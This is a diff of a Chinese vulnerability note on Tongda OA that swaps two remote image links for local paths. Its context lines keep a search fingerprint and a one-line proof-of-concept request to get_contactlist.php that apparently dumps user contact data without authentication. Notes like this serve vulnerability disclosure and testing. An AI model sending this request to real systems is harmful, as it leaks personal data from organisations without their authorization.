@@ -20,7 +20,7 @@ app="TDXK-通达OA"
 
 版本信息
 
-![image-20220520154718609](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201547687.png)
+![image-20220520154718609](./images/202205201547687.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="TDXK-通达OA"
 /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
 ```
 
-![image-20220520154741599](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201547656.png)
+![image-20220520154741599](./images/202205201547656.png)
